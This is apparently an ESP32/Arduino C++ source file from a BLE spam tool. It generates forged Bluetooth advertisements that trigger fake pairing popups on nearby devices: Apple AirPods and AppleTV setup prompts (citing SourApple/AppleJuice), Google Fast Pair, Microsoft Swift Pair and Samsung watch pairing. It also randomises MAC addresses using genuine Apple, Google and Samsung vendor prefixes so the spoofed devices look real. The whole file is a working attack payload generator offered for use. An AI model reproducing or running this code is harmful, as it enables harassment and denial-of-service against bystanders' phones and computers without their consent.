#include "ble_spam_utils.h"
#include <Arduino.h>

// --- Data Definitions ---

const uint8_t IOS_DEVICES[][31] = {
    {0x02}, // Airpods
    {0x0e}, // AirpodsPro
    {0x0a}, // AirpodsMax
    {0x0f}, // AirpodsGen2
    {0x13}, // AirpodsGen3
    {0x14}, // AirpodsProGen2
    {0x03}, // PowerBeats
    {0x0b}, // PowerBeatsPro
    {0x0c}, // BeatsSoloPro
    {0x11}, // BeatsStudioBuds
    {0x10}, // BeatsFlex
    {0x05}, // BeatsX
    {0x06}, // BeatsSolo3
    {0x09}, // BeatsStudio3
    {0x17}, // BeatsStudioPro
    {0x12}, // BeatsFitPro
    {0x16}, // BeatsStdBudsPlus
    {0x20}, // PowerBeats4
    {0x01}, // AirPodsGen1
};

const uint8_t IOS_ACTIONS[] = {
    0x01, // AppleTVSetup
    0x06, // AppleTVPair
    0x20, // AppleTVNewUser
    0x2b, // AppleTVAppleIDSetup
    0xc0, // AppleTVWirelessAudioSync
    0x0d, // AppleTVHomekitSetup
    0x13, // AppleTVKeyboard
    0x27, // AppleTVConnectingNetwork
    0x0b, // HomepodSetup
    0x09, // SetupNewPhone
    0x02, // TransferNumber
    0x1e, // TVColorBalance
    0x24, // AppleVisionPro
};

const uint32_t ANDROID_MODELS[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007, 0x000009, 
    0x090000, 0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 
    0xF00400, 0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4, 
    0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886, 
    0xF00001, 0xF00201, 0xF00209, 0xF00205, 0xF00305, 0xF00E97, 0x04ACFC, 0x04AA91, 
    0x04AFB8, 0x05A963, 0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 
    0x1E955B, 0x1EC95C, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 
    0x07C95C, 0x07F426, 0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0xD99CA1, 
    0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9, 0x13B39D, 0x7C6CDB, 0x005EF9, 
    0xE2106F, 0xB37A62, 0x92ADC9,
    // Additional models for more variety
    0x2D7A23, 0x0E30C3, 0x72EF8D, 0x0003F0, 0x002000, 0x003000, 0x003001, 0x00A168,
    0x01EEB4, 0x02AA91, 0x01C95C, 0x02D815, 0x035764, 0x038CC7, 0x02DD4F, 0x02E2A9,
    0x035754, 0x02C95C, 0x03AA91, 0x03C95C, 0x04C95C, 0x050F0C, 0x052CC7, 0x058D08,
    0x1ED9F9, 0x1EE890, 0x1EEDF5, 0x1F1101, 0x1F181A, 0x1F2E13, 0x1F4589, 0x1F4627,
    0x1F5865, 0x1FBB50, 0x1FC95C, 0x1FE765, 0x1FF8FA, 0x201C7C, 0x202B3D, 0x20330C
};

const uint8_t SAMSUNG_WATCH_MODELS[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 
    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20
};

// --- Helper Functions ---

void BLESpamUtils::generateRandomMac(uint8_t* mac) {
    // Use common OUI prefixes for more realistic MACs
    const uint8_t OUI_PREFIXES[][3] = {
        {0x00, 0x1A, 0x7D}, // Apple
        {0x00, 0x16, 0xCB}, // Apple
        {0x94, 0x65, 0x9C}, // Apple
        {0xF8, 0xFF, 0xC2}, // Google
        {0xAC, 0x37, 0x43}, // Google
        {0xFC, 0xE8, 0x92}, // Samsung
        {0x34, 0x08, 0xBC}, // Samsung
    };
    
    // Randomly select an OUI or fully random
    if (random(0, 100) < 70) { // 70% use real OUI
        int ouiIdx = random(0, 7);
        memcpy(mac, OUI_PREFIXES[ouiIdx], 3);
        for (int i = 3; i < 6; i++) {
            mac[i] = random(0, 256);
        }
    } else { // 30% fully random
        for (int i = 0; i < 6; i++) {
            mac[i] = random(0, 256);
        }
        mac[0] = (mac[0] & 0xFC) | 0x02;
    }
}

std::vector<uint8_t> BLESpamUtils::getAdvertisementData(SpamType type) {
    std::vector<uint8_t> data;

    if (type == KITCHEN_SINK) {
        type = (SpamType)random(0, 4);
    }

    switch (type) {
        case IOS_POPUP: {
            // SourApple / AppleJuice Logic
            // Manufacturer: 0x004C (Apple)
            
            data.push_back(0x4C);
            data.push_back(0x00);
            
            int subtype = random(0, 3);
            if (subtype == 0) { // Airpods style
                uint8_t device = IOS_DEVICES[random(0, sizeof(IOS_DEVICES)/31)][0];
                data.push_back(0x0F); // Type
                data.push_back(0x05); // Length
                data.push_back(0xC1); // Action Flags
                data.push_back(device); // Device Type
                data.push_back(random(0, 256));
                data.push_back(random(0, 256));
                data.push_back(random(0, 256));
            } else if (subtype == 1) { // Setup style (IOS2 from Bruce)
                uint8_t action = IOS_ACTIONS[random(0, sizeof(IOS_ACTIONS))];
                uint8_t payload[] = {
                    0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 
                    0x0f, 0x05, 0xc1, 
                    action, 
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
                };
                for(uint8_t b : payload) data.push_back(b);
            } else { // Extended proximity pairing
                uint8_t device = IOS_DEVICES[random(0, sizeof(IOS_DEVICES)/31)][0];
                data.push_back(0x07); // Type (Proximity)
                data.push_back(0x19); // Length
                data.push_back(0x07); // Flags
                data.push_back(device);
                for (int i = 0; i < 21; i++) {
                    data.push_back(random(0, 256));
                }
            }
            break;
        }
        
        case ANDROID_PAIR: {
            // Google Fast Pair
            // Service UUID: 0xFE2C
            // Data after UUID: Model (3) + 0x02 + 0x0A + RSSI (1)
            
            uint32_t model = ANDROID_MODELS[random(0, sizeof(ANDROID_MODELS)/sizeof(uint32_t))];
            
            data.push_back((model >> 16) & 0xFF);
            data.push_back((model >> 8) & 0xFF);
            data.push_back(model & 0xFF);
            
            data.push_back(0x02);
            data.push_back(0x0A);
            data.push_back((uint8_t)((random(0, 120)) - 100)); // RSSI
            break;
        }
        
        case WINDOWS_PAIR: {
            // Microsoft Swift Pair
            // Manufacturer: 0x0006 (Microsoft)
            data.push_back(0x06);
            data.push_back(0x00);
            
            data.push_back(0x03); // Beacon Type
            data.push_back(0x00); // Subtype
            data.push_back(0x80); // RSSI/CoD
            
            // Random Name
            const char* name = "Office PC";
            for (int i = 0; i < strlen(name); i++) data.push_back(name[i]);
            break;
        }
        
        case SAMSUNG_PAIR: {
            // Samsung
            // Manufacturer: 0x0075 (Samsung)
            data.push_back(0x75);
            data.push_back(0x00);
            
            uint8_t model = SAMSUNG_WATCH_MODELS[random(0, sizeof(SAMSUNG_WATCH_MODELS))];
            
            // 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
            uint8_t payload[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model};
            for(uint8_t b : payload) data.push_back(b);
            break;
        }
    }
    
    return data;
}
